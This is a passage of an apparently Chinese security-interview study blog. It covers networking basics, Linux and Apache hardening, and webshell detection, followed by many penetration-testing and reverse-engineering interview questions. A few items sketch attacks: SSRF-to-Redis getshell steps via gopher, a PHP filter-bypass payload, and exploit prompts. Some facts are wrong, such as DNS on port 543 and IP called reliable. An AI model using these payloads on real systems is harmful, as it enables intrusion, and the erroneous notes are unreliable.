客户端ACK=FIN+1-&gt;服务端假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！ MSL=最大段寿命=TTL=最大生存时间=255s 四层模型 应用层 应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等. 传输层 传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP). TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务. 网际互联层 网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。 IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。 网络接入层（即主机-网络层） 网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。当你输入一个网址，点击访问，会发生什么？查找DNS记录 查看浏览器缓存 查看系统缓存 查看路由器缓存 查找ISP DNS缓存 递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP建立连接 跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文 常见的状态码OSI七层物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)OSI四层路由协议你搭建过的最复杂的网络设备是什么使用过什么硬件设备Linux运维启动过程Linux基线规范每个公司有每个公司的基线规范体系，但是答题分为下列五个方面账号管理和授权 检查特殊账号，是否存在空密码的账户和root权限账户 禁用或删除无用账号 添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数 禁止root远程登录，限制root用户直接登录。 检查su权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test服务 关闭不必要的服务 SSH服务安全 不允许root账号直接登录系统，PermitRootLogin=no 修改SSH使用的协议版本为2 修改允许密码错误次数（默认6次），MaxAuthTries=3文件系统 设置umask值 vi /etc/profile 添加行 umask 027 设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180日志 启用syslogd日志，配置日志目录权限，或者设置日志服务器 记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。https://www.alibabacloud.com/help/zh/faq-detail/49809.htmIP协议安全要求 远程登录取消telnet采用ssh 设置/etc/hosts.allow和deny 禁止ICMP重定向 禁止源路由转发 防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)中间件基线规范（APACHE） https://www.alibabacloud.com/help/zh/faq-detail/52981.htm 配置 账号 授权 日志 session过期时间（防ddos 绑定监听地址禁止 目录权限 访问外部文件 CGI 非法HTTP方法（PUT DELETE）隐藏 服务版本号 重定向错误页面删除 配置文件 默认安装的无用文件webshell检测思路 https://blog.csdn.net/u011066706/article/details/51175971webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。 静态检测静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。静态检测配合人工一个检查工具 https://github.com/he1m4n6a/findWebshell动态检测Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。日志检测使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。语法检测实现关键危险函数的捕捉方式统计学检测webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。 典型的代表: NeoPI – https://github.com/Neohapsis/NeoPI防范webshell https://blog.csdn.net/nohaoye/article/details/46987587防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。 计划任务 https://blog.csdn.net/kx_nullpointer/article/details/21299873 at batch crontab anacron：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次自动化运维编写过什么脚本yum用的什么源（本地自搭，挂载）awk sed的使用排错思路，排错经验网络 防火墙 配置 权限日志分析ELK的使用和分析 https://www.zhihu.com/question/21427267 Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。 Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。 Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。举例-阿里规范 用户历史命令记录缺点：安全性不够。使用x-pack实现安全认证及权限管理功能事件发生的分析用户权限管理(修改)防火墙IPsec VPN安全监控工具 web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计 zabbix性能监控工具 HIDSLinux木马查杀常见的设备有啥 防火墙 utm 负载均衡设备 IPS IDS(HIDS基于主机型入侵检测系统) 堡垒机 蜜罐 网闸 waf 扫描器 soc(ossim开源安全信息管理系统)Windows运维基线规范木马查杀脱壳，反汇编计划任务 控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务 schtasks命令 语法: schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | &quot;System&quot;} [/rpPassword]] /?ISO27000和等保(重点等保)说一下ISO27000ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。PDCA（plan do check action）管理循环说一下等级保护制度《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。差异 浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全 共性算法排序算法：快排 二分 冒泡LDAP注入 http://www.4hou.com/technology/9090.html https://blog.csdn.net/quiet_girl/article/details/50716312","categories":[{"name":"面经总结","slug":"面经总结","permalink":"http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"面经","slug":"面经","permalink":"http://yoursite.com/tags/%E9%9D%A2%E7%BB%8F/"}]},{"title":"笔试面经","slug":"笔试面经","date":"2020-02-26T03:06:52.000Z","updated":"2020-02-27T04:23:14.706Z","comments":true,"path":"2020/02/26/笔试面经/","link":"","permalink":"http://yoursite.com/2020/02/26/%E7%AC%94%E8%AF%95%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"在SSRF漏洞中利用gopher协议攻击redis进行getshell，如何构造payload，写出操作步骤 1231.先在本地复现，使用socat抓取攻击数据包。2.将上一步抓取的数据包使用脚本进行转码，使其适用与gopher。3.及那个上述poc发送，如http:&#x2F;&#x2F;www.xxx.com&#x2F;1.php?url&#x3D;gopher:&#x2F;&#x2F;111.111.111.111:6379&#x2F;&#123;poc&#125; 分析XSS防御被绕过的场景 1编码绕过 代码存在漏洞吗？若存在，则给出payload（如执行phpinfo） 12345678910111213&lt;?php&gt;$text &#x3D; $_GET[&#39;content&#39;];if(preg_match(&#39;&#x2F;&lt;&gt;?&#x2F;&#39;,$text))&#123;die(&#39;you bad boy&#39;);&#125;file_put_contents(&#39;config.php&#39;,$text);?&gt; 1存在，http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?content[]&#x3D;&lt;?php phpinfo();&gt; Android常见的反调试技术 123456789安卓调试检测函数IDA调试端口检测调试器进程名检测检测系统关键文件检测安卓内核修改多进程反调试代码执行时间检测rtld_db_dlactivity函数https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-709669-1-1.html \\5. https中间人攻击的原因？具体实现层面的成因 \\6. Android https中间人攻击通常有哪些？ \\7. webview file 域远程信息泄露需要开启哪三个方法 \\8. Android动态加载有几种方式？区别是什么 \\9. Android App 研发中，广播是否都需要写在manifest.xml中？若不是，请说明其他实现广播功能的方法 \\10. SSRF漏洞原理。如何防御 \\11. 内网渗透如何躲避监控？ \\12. 实现简单爬虫爬取页面，能过滤输出所有标签 \\13. 根据智能家居使用场景，设计一个针对只能硬件与云端、手机端APP之间“安全”的同步认证凭证和交互控制（如APP操作智能硬件等）的协议 \\1. 内存断点：改0xcc能实现中断吗？ 可以 \\2. TCP报头的控制字段是什么 \\3. N阶三对角带状矩阵 \\4. 劫持首页可以用哪些手段？ PAC/BHO/DNS \\5. 堆排序是怎样的？逆序列是什么？ \\1. http响应类型 \\2. https可以防御csrf吗 \\3. activity 生命周期不包括哪个？ 不包括onFinish() onResume() onRestart() onDestory() onFinish() -———————————————————— 一个最简单的完整的Activity生命周期会按照如下顺序回调：onCreate -&gt; onStart -&gt; onResume -&gt; onPause -&gt; onStop -&gt; onDestroy。称之为\\entire lifetime。** -———————————————————— \\4. UPX PEid \\5. Eip指向下一个被执行文件吗？ \\6. crossdomain.xml文件的用途 \\7. redis默认端口是多少？ ​ 6379 \\8. 若是未经授权，redis有几种利用方式 \\9. 微信支付漏洞原理，修复建议是什么 \\10. elf文件是什么 \\11. re正则规范了解一下 \\12. 字符盲注：怎么获取数据库名 /?id = … \\13. xss和csrf的区别 \\1. RARP 、DNS属于哪层协议 \\2. user-agent中 AppleWebkit是什么系统 \\3. 了解：永恒之蓝，rdp弱口令、strut2-045 \\4. 哪种weib攻击防火墙几乎无法防御？ SQL/XSS/越权/一句话木马 \\5. nmap的功能 \\6. 哪个TCP数据包异常？：syn/ack置1/TCP报头全为0/报头全为1/syn/fin都为1 \\7. 远程文件包含漏洞 \\8. PCHunter autoruns tcpview \\9. 可直接获取webshell的漏洞有哪些？ webdav方法开启可以吗 \\10. 正则 ^200 [^200]的区别 11.控制用户访问Apache目录的配置文件是什么？ \\12. google hacking \\13. LOIC Icesword \\14. web安全核心问题什么？接受用户参数吗？ \\15. DNS的AAAA什么意思 \\16. DNS服务器投毒 \\17. 菜刀 穿山甲 beef 使用时的报文形式 \\18. IIS 6.0 解析漏洞 \\19. 数字型注入 \\20. $_GET[id] == 1024 什么意思 \\1. Final类型有哪些？（多选） hashtable string stringbuffer hashmap \\2. 强引用 弱引用 幻象引用 软引用 \\3. post-mortem机制 \\4. TCP/UDP粘包问题 \\5. DNS、NFS\\SNMP等使用什么协议（TCP?UDP?） \\6. “4+1” 视图模型 \\7. 快速排序 \\8. 什么效果 \\9. 乐观锁 悲观锁 \\10. 哈希表是存储结构吗 \\11. server用cookie跟踪用户吗？ \\12. cc攻击/ddos应急响应办法 \\1. 如何检测程序API是否被hook \\2. 设计方案，判断linux主机是否被攻击 \\3. 同事windows中毒了，如何清理病毒病分析中毒原因 \\4. 根据文件写逆向分析报告，写出逆向的步骤和思路 crakeme pwn_linux_64 \\1. nmap用哪些协议进行扫描 \\2. 文件上传漏洞如何进行渗透 \\3. struts2漏洞原理 \\4. 心脏滴血漏洞原理 \\1. linux SUID \\2. 哪些功能可能讯在csrf \\3. BLE易受哪些攻击 \\4. LD_PRELOAD环境变量 \\5. linux被遭攻击，哪个日志文件可以看 \\6. 绕过DEP保护进行缓冲区溢出的方式 \\7. HeapSpray漏洞 \\8. 如何伪造SHE爆破安全cookie 2017_ali_spring_1 12www.vuln.xxx&#x2F;show_pic?image&#x3D;http:&#x2F;&#x2F;image.test.com&#x2F;1.jpg上述URL可能引起的安全问题有哪些？详细阐述下，如果存在该漏洞会产生什么危害？通常情况下，你会如何利用？ 2017_ali_spring_2 1TCP和UDP协议的区别？路由器、交换机、防火墙等网络设备在配置ACL时应注意哪些问题？ 2017_ali_spring_3 1234567891011以下c代码是否包含安全漏洞，如存在漏洞，请说出漏洞如何触发？bool funcA(unsigned int cbSize)&#123; if (cbSize &lt; 1024) &#123; char *buf &#x3D; new char[cbSize-1]; memset(buf,0,cbSize-1); delete buf; return true;&#125; else return false;&#125; 2017_ali_spring_4 123456789101112131415161718192021代码所执行的环境是Linux kalilocal 4.9.0-kali1-amd64 (2017-01-30) x86_64 GNU&#x2F;Linux如果编译命令是gcc test.c -o test ，请你写出可以获取secret 的所有方法#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;char secret[10];int create_secret()&#123; int fd; fd &#x3D; open(&quot;secret&quot;,O_RDONLY); read(fd,secret,10); return 0;&#125;int main()&#123; char format[10] &#x3D; &quot;%s&quot;; char username[10]; create_secret(); scanf(format,username); printf(format,username); return 0;&#125; 2017_ali_spring_5 12现有办公网、生产网各一份DNS服务器采集的DNS日志，包括时间、请求域名domain、请求类型type、返回值value、源IP、源端口信息。根据这两份数据，分别阐述你可以产出什么类型的安全告警，并作简要思路说明。 2017_ali_spring_6 1如何通过数据分析的方式检测出一个系统账户被非其所有人使用 2017_ali_spring_7 123456789101112131415161718192021222324252627282930313233以下是一份iOS crash日志，这份日志里面有哪些问题？应该如何分析？Incident Identifier: 12F51135-7348-4683-9CF2-2285669EAB89CrashReporter Key: 670f3f77d42a1d3e752f10392bb38290eebf5af9Hardware Model: iPad4,1Version: 1.0.0.02220012 (1.0.0)Code Type: ARM-64 (Native)Parent Process: launchd [1]Exception Type: EXC_BAD_ACCESS (SIGBUS)Exception Subtype: KERN_PROTECTION_FAILURE at 0x000000010a463500Triggered by Thread: 0 Filtered syslog:None found Thread 0 name: Dispatch queue: com.apple.main-threadThread 0 Crashed:0 ??? 0x10a463500 0x00000000 + 0x10a4635001 JavaScriptCore 0x187eeea88 0x187b14000 + 0x3daa88 &#x2F;&#x2F; long long JSC::APICallbackFunction::call&lt;JSC::JSCallbackFunction&gt;(JSC::ExecState*) + 0x1a42 JavaScriptCore 0x187b5a3b4 0x187b14000 + 0x463b4 &#x2F;&#x2F; JSC::LLInt::setUpCall(JSC::ExecState*, JSC::Instruction*, JSC::CodeSpecializationKind, JSC::JSValue, JSC::LLIntCallLinkInfo*) + 0x1dc3 JavaScriptCore 0x187f9dd68 0x187b14000 + 0x489d68 &#x2F;&#x2F; llint_entry + 0x5c584 JavaScriptCore 0x187f97ef8 0x187b14000 + 0x483ef8 &#x2F;&#x2F; vmEntryToJavaScript + 0x1385 JavaScriptCore 0x187ec4c48 0x187b14000 + 0x3b0c48 &#x2F;&#x2F; JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) + 0xb46 JavaScriptCore 0x187b45660 0x187b14000 + 0x31660 &#x2F;&#x2F; JSC::Interpreter::execute(JSC::ProgramExecutable*, JSC::ExecState*, JSC::JSObject*) + 0x200c7 JavaScriptCore 0x187c9dab0 0x187b14000 + 0x189ab0 &#x2F;&#x2F; JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&amp;, JSC::JSValue, WTF::NakedPtr&lt;JSC::Exception&gt;&amp;) + 0x1b88 JavaScriptCore 0x187ee8964 0x187b14000 + 0x3d4964 &#x2F;&#x2F; JSEvaluateScript + 0x1a09 + libcycript.dylib 0x10aaab6c0 0x10aa64000 + 0x476c0 &#x2F;&#x2F; CYExecute(OpaqueJSContext const*, CYPool&amp;, CYUTF8String) + 0x9c10 + libcycript.dylib 0x10aad0af0 0x10aa64000 + 0x6caf0 &#x2F;&#x2F; CYPerform(void*) + 0x4411 CoreFoundation 0x1864a0544 0x1863c4000 + 0xdc544 &#x2F;&#x2F; __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 0x1812 CoreFoundation 0x18649ffd8 0x1863c4000 + 0xdbfd8 &#x2F;&#x2F; __CFRunLoopDoSources0 + 0x21c13 CoreFoundation 0x18649dcd8 0x1863c4000 + 0xd9cd8 &#x2F;&#x2F; __CFRunLoopRun + 0x2d414 CoreFoundation 0x1863ccca0 0x1863c4000 + 0x8ca0 &#x2F;&#x2F; CFRunLoopRunSpecific + 0x18015 GraphicsServices 0x191434088 0x191428000 + 0xc088 &#x2F;&#x2F; GSEventRunModal + 0xb4 2017_ali_spring_8 1在android的加壳的方案里，很多壳都会引入反调试机制。列举你所知道的反调试技术，三种以上，并给出原理。 2017_ali_spring_9 1作为一个安全研究者, 你能想到哪些办法对家里的IoT设备进行加固, 避免其遭受黑客攻击？ 2017_ali_spring_10 12345678以下为某蠕虫执行命令日志，请问这个蠕虫想通过这些命令达到什么效果。&#x2F;bin&#x2F;busybox echo -e &#39;\\\\x6b\\\\x61\\\\x6d\\\\x69&#x2F;run&#39; &gt; &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;run&#x2F;.nippon&#x2F;bin&#x2F;busybox echo -e &#39;\\\\x6b\\\\x61\\\\x6d\\\\x69&#x2F;tmp&#39; &gt; &#x2F;tmp&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;tmp&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;tmp&#x2F;.nippon&#x2F;bin&#x2F;busybox echo -e &#39;\\\\x6b\\\\x61\\\\x6d\\\\x69&#x2F;sys&#39; &gt; &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;sys&#x2F;.nippon&#x2F;bin&#x2F;busybox echo -e &#39;\\\\x6b\\\\x61\\\\x6d\\\\x69&#x2F;run&#39; &gt; &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;run&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;run&#x2F;.nippon&#x2F;bin&#x2F;busybox echo -e &#39;\\\\x6b\\\\x61\\\\x6d\\\\x69&#x2F;dev&#39; &gt; &#x2F;dev&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;dev&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;dev&#x2F;.nippon&#x2F;bin&#x2F;busybox echo -e &#39;\\\\x6b\\\\x61\\\\x6d\\\\x69&#x2F;sys&#39; &gt; &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox cat &#x2F;sys&#x2F;.nippon; &#x2F;bin&#x2F;busybox rm &#x2F;sys&#x2F;.nippon 2017_ali_spring_11 1如何给linux web服务器做加固，请简述步骤。 2017_ali_spring_12 1通过Linux系统的&#x2F;proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？ 2017_ali_spring_13 1linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。 2017_ali_spring_14 12你通过某爬虫获得了 *.aliyun.com 下100万条URL（包括动态页面、静态资源等URL），接下来你打算对这些URL进行黑盒扫描。为了提高扫描效率，你需要对这些URL进行去重。请简述你的URL去重方案及理由。 2017_ali_spring_15 1请简要描述最近的struts2 S2-045漏洞的原理，及构造POC需要满足怎样的条件？ 2017_ali_spring_16 12345678910111213141516171819请分析如下代码有何漏洞，并给出exploit。&lt;?phpif (isset($_POST[&#39;upload&#39;])) &#123; $upload_dir &#x3D; &quot;uploads&#x2F;&quot;; $file_name &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;]; $file_extension &#x3D; substr($file_name, strrpos($file_name, &#39;.&#39;) + 1); $file_type &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;]; $file_size &#x3D; $_FILES[&#39;file&#39;][&#39;size&#39;]; if (($file_type &#x3D;&#x3D; &quot;image&#x2F;jpeg&quot; || $file_type &#x3D;&#x3D; &quot;image&#x2F;png&quot;) &amp;&amp; $file_size &lt;100000) &#123; $save_file_name &#x3D; time(); $save_path &#x3D; $upload_dir . $save_file_name . &quot;.&quot; . $file_extension; if (!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $save_path)) &#123; echo &quot;your image is not uploaded&quot;; &#125; else &#123; echo &quot;wrong file type.Only accept images&quot;; &#125;&#125; 2017_ali_spring_17 123小明对一站点进行渗透测试，发现一处参数明显存在shell命令注入问题。但是&quot;| ls&quot;，&quot;&#39; &amp;&amp; ls #&quot;等方式均无法执行成功命令。请分析具体的情况，并给出各种情况下的测试步骤。 2017_ali_spring_18 12请说出网络防火墙的不同类别，它们分别在安全上有什么优势和缺点，以及在大型互联网公司，更适合采用何种网络防火墙，为什么？ 2017_ali_spring_19 123本题故意留空.来自 https:&#x2F;&#x2F;github.com&#x2F;SecYouth&#x2F;all-about-security-jobsQQ群 306335642 2017_ali_spring_20 123456789101112131415161718192021222324252627282930313233343536373839404142请阅读下面一段汇编代码，判断其是否存在安全漏洞？如果存在，请指出漏洞成因make_table proc nearsrc &#x3D; qword ptr -20hvar_18 &#x3D; dword ptr -18hn &#x3D; qword ptr -14hsize &#x3D; qword ptr -8 push rbp mov rbp, rsp sub rsp, 20h mov dword ptr [rbp+n], edi mov [rbp+var_18], esi mov [rbp+src], rdx mov eax, dword ptr [rbp+n] imul eax, [rbp+var_18] mov dword ptr [rbp+size], eax mov eax, dword ptr [rbp+size] mov rdi, rax ; size call _malloc mov [rbp+n+4], rax cmp [rbp+n+4], 0 jnz short loc_4005D6 mov eax, 0 jmp short locret_400611loc_4005D6: mov dword ptr [rbp+size+4], 0 jmp short loc_400605loc_4005DF: mov edx, dword ptr [rbp+n] ; n mov eax, dword ptr [rbp+size+4] imul eax, dword ptr [rbp+n] mov ecx, eax mov rax, [rbp+n+4] add rcx, rax mov rax, [rbp+src] mov rsi, rax mov rdi, rcx call _memcpy add dword ptr [rbp+size+4], 1 loc_400605: 2017_ali_spring_21 123现有办公网、生产网各一份DNS服务器采集的DNS日志，包括时间、请求域名domain、请求类型type、返回值value、源IP、源端口信息。根据这两份数据，分别阐述你可以产出什么类型的安全告警，并作简要思路说明。 2017_ali_spring_22 1Objective-C语言里的isa是什么？ 2017_ali_spring_23 1有什么利弊？小明周末去星巴克喝咖啡，回到家后，发现他的微博帐号被人盗用了。请问可能发生什么事情了，原理是什么，如何防范 2017_ali_spring_24 1分别介绍下method-swizzling和isa-swizzling，以及它们通常用在什么场景下？ 2017_ali_spring_25 1234淘宝日常流量中有一部分不法人员通过机器批量秒杀商品，或者通过web安全技术对阿里的系统进行攻击盗取账号等，对消费者和商家造成一定危害，如果现在要你通过一套算法体系准确区分出正常流量和恶意流量？如果有对正常流量的错分类，该如何做？ 2017_ali_spring_26 1请说出至少3个IOT设备使用的网络通信协议，并简述其特点。 2017_ali_spring_27 1描述cloudbleed漏洞的主要成因。 2017_ali_spring_28 1234567891011如下是某司批量执行普通员工提交任务的守护进程，普通员工通过创建文件&#x2F;opt&#x2F;task&#x2F;tasklist.sh提交任务，其核心逻辑如下:struct stat info;stat(&quot;&#x2F;opt&#x2F;task&#x2F;tasklist.sh&quot;, &amp;info);setgid(info.st_gid);setuid(info.st_uid);system(&quot;&#x2F;opt&#x2F;task&#x2F;tasklist.sh&quot;);该进程运行时状态如下:UID PID PPID C STIME TTY TIME CMDroot 4337 3977 0 15:29 pts&#x2F;2 00:00:00 supervisor该程序存在严重漏洞，请给出exploit。请分析该代码违反哪些安全编码原则?如何设计自动化审计程序发现所有代码中存在的问题? 2017_ali_spring_29 1如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。 2017_ali_spring_30 12345某非著名购物网站最近发现总是收到用户投诉订单信息被泄漏，网站安全专家严格排查了服务器和数据库的日志，没有发现入侵迹象，但发现在web访问日志有一个用户访问订单页面的次数非常多而且url中的订单号是连续的，网站安全专家马上明白了问题所在，请问安全专家明白了什么？这个问题如何解决？ 2017_ali_spring_31 123一个blog系统中如果需要使用富文本编辑器，用来展示图片、不同的字体和格式需要使用html中的富文本标签例如&lt;img&gt;等，在这种场景下，可能会存在哪些方面的安全风险，应该如何进行防御？ 2017_ali_spring_32 1234567对于如下模版：&lt;script&gt; var s&#x3D;&#39;$&#123;a&#125;&#39;+&#39;$&#123;b&#125;&#39;;&lt;&#x2F;script&gt;其中a,b为用户输入的参数，过滤了单引号和尖括号，是否存在xss漏洞，若存在给出利用代码 2017_ali_spring_33 1简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。 2017_ali_spring_34 1请列出黑客绕过WAF的安全防护的方法，并简述如何实现？ 2017_ali_spring_35 123比特币挖矿软件的常用协议有哪些, 如何在网络层去检测挖矿行为, 给出检测方案.&lt;!&gt; 具体题干未知. 2017_ali_spring_36 12给了一段android权限的xml, 要求描述可能操作&lt;!&gt; 具体题干未知. 2017_ali_spring_37 12botnet有哪些威胁 如何检测 如何解决&lt;!&gt; 具体题干未知. 2017_ali_spring_38 1服务器代理技术分为哪几类? 在安全上分别有怎样的应用? 分别面临怎样的安全风险? 2017_ali_spring_39 123通过Fuzz对某个开源工具进行漏洞挖掘，如果使用该工具进行Fuzz并长时间未能得到任何结果， 应该如何诊断问题并改进Fuzz方法 2017_ali_spring_40 1请写出一个尽可能完整的http请求包，并分析哪些字段可用作攻击，写出具体的场景和对应的安全风险。 2017_ali_spring_41 12日常生活中用算法解决了什么问题&lt;!&gt; 具体题干未知. 2017_ali_spring_42 12为了通过日志排查营销活动中批量小号抽奖的行为， 请设计需要获取的事件格式，并且制定识别策略。 2017_ali_spring_43 123逆向工具打开一个APK的dex, 发现所有类名都是a b v a$a 之类的。这种命名是如何实现的, 针对这种命名, 如何进行高效的逆向分析?&lt;!&gt; 具体题干未知. 2017_ali_spring_44 12当前IOT设备存在哪些安全问题, 硬件+软件 如何防御&lt;!&gt; 具体题干未知. 2017_ali_spring_45 12黑客入侵以后, 加密所有数据对使用者进行勒索, 从os和sql考虑如何防御.&lt;!&gt; 具体题干未知. 2017_ali_spring_46 12基于docker容器技术为客户提供服务, 看服务器运行docker容器时的进程信息, 分析服务器平台自身是否存在风险&lt;!&gt; 具体题干未知. 2017_ali_spring_47 123某LNMP架构的大型网站存在文件包含漏洞, 没有上传点, 如何利用该弱点上传webshell, 如何防御&lt;!&gt; 具体题干未知. 2017_ali_spring_48 12如何实现一个被动web扫描器, 要有亮点功能&lt;!&gt; 具体题干未知. 2017_ali_spring_49 12IoT攻防和普通计算机网络攻防的区别&lt;!&gt; 具体题干未知. 2017_baidu_spring_1 12请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。端口：21、22、873、1433、3306、6379、11211 2017_baidu_spring_2 1你所知道的网络抓包工具有哪些？对android或者ios设备怎么进行抓包。 2017_baidu_spring_3 1请说明黑客常用的清除痕迹的方式及对应的监控方法（linux和windows系统） 2017_baidu_spring_4 1罗列最近几年影响较大的安全漏洞并请大概介绍其原理、危害（请列举3个） 2017_baidu_spring_5 1介绍你所知道的加密算法，都属于什么类型的加密算法？怎么保证加密的安全性？ 2017_baidu_spring_6 1PHP中了解有哪些容易导致漏洞的危险函数？并且简述会造成什么类型的风险 2017_baidu_spring_7 1文件包含漏洞的常见WAF绕过方式（以读取&#x2F;etc&#x2F;passwd为例） 2017_baidu_spring_8 1234现有一个需要注册才能使用的Android 